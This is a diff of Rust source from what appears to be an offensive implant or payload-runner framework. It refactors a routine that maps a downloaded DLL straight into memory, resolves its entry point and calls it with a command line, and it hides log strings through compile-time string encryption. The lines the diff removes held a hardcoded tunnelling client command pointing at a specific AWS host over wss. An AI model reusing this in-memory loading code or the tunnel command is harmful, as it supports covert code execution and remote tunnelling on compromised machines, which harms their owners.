@@ -11,20 +11,17 @@ use crate::payload_util::fail_linux_message;
 use crate::payload_util::set_permission;
 
 #[cfg(target_os = "windows")]
-use std::os::raw::c_int;
-#[cfg(target_os = "windows")]
-use std::os::raw::c_char;
-#[cfg(target_os = "windows")]
-type DllEntryPoint = extern "C" fn(*const c_char);
-//type DllEntryPoint = extern "C" fn();
-// FIRST: 
-//type DllEntryPoint = extern "C" fn() -> c_int;
+type DllEntryPoint = extern "C" fn(*const c_char); //type DllEntryPoint = extern "C" fn() -> c_int;
 #[cfg(target_os = "windows")]
 use crate::python_embedder;
 #[cfg(target_os = "windows")]
 use rspe::reflective_loader;
 #[cfg(target_os = "windows")]
+use std::ffi::CString;
+#[cfg(target_os = "windows")]
 use std::mem;
+#[cfg(target_os = "windows")]
+use std::os::raw::c_char; //use std::os::raw::c_int;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 #[cfg(target_os = "windows")]
@@ -129,12 +126,10 @@ impl Payload {
 pub struct DllFromMemory {
     pub link: Link,
     pub dll_entrypoint: String,
+    pub commandline: String,
     pub thread: bool,
     pub runonce: bool,
 }
-
-#[cfg(target_os = "windows")]
-use std::ffi::CString;
 
 impl DllFromMemory {
     #[cfg(target_os = "linux")]
@@ -149,57 +144,55 @@ impl DllFromMemory {
 
         if self.thread {
             let thread_dll_entrypoint = self.dll_entrypoint.clone();
+            let thread_dll_commandline = self.commandline.clone();
             let dllthread = thread::spawn(move || {
-                let dll_data: &[u8] = &data;
-
-                info!("{}", encrypt_string!("Map DLL in memory"));
-                let mm = memorymodule_rs::MemoryModule::new(dll_data);
-
-                info!(
-                    "{}{}",
-                    encrypt_string!("Retreive DLL entrypoint: "),
-                    &thread_dll_entrypoint
-                );
-                let dll_entry_point = unsafe {
-                    mem::transmute::<_, DllEntryPoint>(mm.get_function(&thread_dll_entrypoint))
-                };
-                info!("{}", encrypt_string!("dll_entry_point(commandline)"));
-
-                let commandline="client -L tcp://127.0.0.1:1080:127.0.0.1:1080 --connection-min-idle 5 --no-color NO_COLOR wss://ec2-51-44-82-197.eu-west-3.compute.amazonaws.com:443";
-                let c_commandline = CString::new(commandline).expect("CString conversion failed");
-                let result = dll_entry_point(c_commandline.as_ptr());
-                drop(mm);
-                info!("drop");
-                //debug!("{}{}", encrypt_string!("DLL result = "), result);
+                dll_from_memory_exec(data, thread_dll_entrypoint, thread_dll_commandline);
             });
             return Ok(PayloadExecThread::Thread(
                 dllthread,
                 Payload::DllFromMemory(self.clone()),
             ));
         } else {
-            let dll_data: &[u8] = &data;
-            info!("{}", encrypt_string!("Map DLL in memory"));
-            let mm = memorymodule_rs::MemoryModule::new(dll_data);
-
-            info!(
-                "{}{}",
-                encrypt_string!("Retreive DLL entrypoint: "),
-                &self.dll_entrypoint
-            );
-            let dll_entry_point = unsafe {
-                mem::transmute::<_, DllEntryPoint>(mm.get_function(&self.dll_entrypoint))
-            };
-            info!("{}", encrypt_string!("dll_entry_point()"));
-            error!("{}", encrypt_string!("TODO not coded"));
-
-            //let result = dll_entry_point();
-            drop(mm);
-            info!("drop");
-            //debug!("{}{}", encrypt_string!("DLL result = "), result);
+            dll_from_memory_exec(data, self.dll_entrypoint.clone(), self.commandline.clone());
             return Ok(PayloadExecThread::NoThread());
         }
-        // TODO quand on part d'ici, il y a un probleme
     }
+}
+
+#[cfg(target_os = "windows")]
+pub fn dll_from_memory_exec(data: Vec<u8>, dll_entrypoint: String, dll_commandline: String) {
+    let dll_data: &[u8] = &data;
+    info!(
+        "{}",
+        encrypt_string!("Map DLL in memory (MemoryLoadLibrary)")
+    );
+    let mm = memorymodule_rs::MemoryModule::new(dll_data);
+    info!(
+        "{}{}{}",
+        encrypt_string!("Retreive DLL entrypoint: "),
+        &dll_entrypoint,
+        encrypt_string!(" via (MemoryGetProcAddress)"),
+    );
+
+    let dll_entry_point =
+        unsafe { mem::transmute::<_, DllEntryPoint>(mm.get_function(&dll_entrypoint)) };
+    info!(
+        "{}{}{}{}{}",
+        encrypt_string!("commandline for DLL."),
+        &dll_entrypoint,
+        encrypt_string!(".('"),
+        &dll_commandline,
+        encrypt_string!("')")
+    );
+    let c_commandline = CString::new(dll_commandline).unwrap_or_else(|e| {
+        error!("Error in CString conversion: {}", e);
+        CString::new("").unwrap()
+    });
+    info!("{}", encrypt_string!("dll_entry_point()"),);
+    let _result = dll_entry_point(c_commandline.as_ptr());
+    info!("{}", encrypt_string!("Drop DLL memory (MemoryFreeLibrary)"));
+    drop(mm);
+    info!("{}", encrypt_string!("DllFromMemory: end"));
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
@@ -379,7 +372,6 @@ impl Exec {
     }
 }
 */
-
 
 impl Exec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
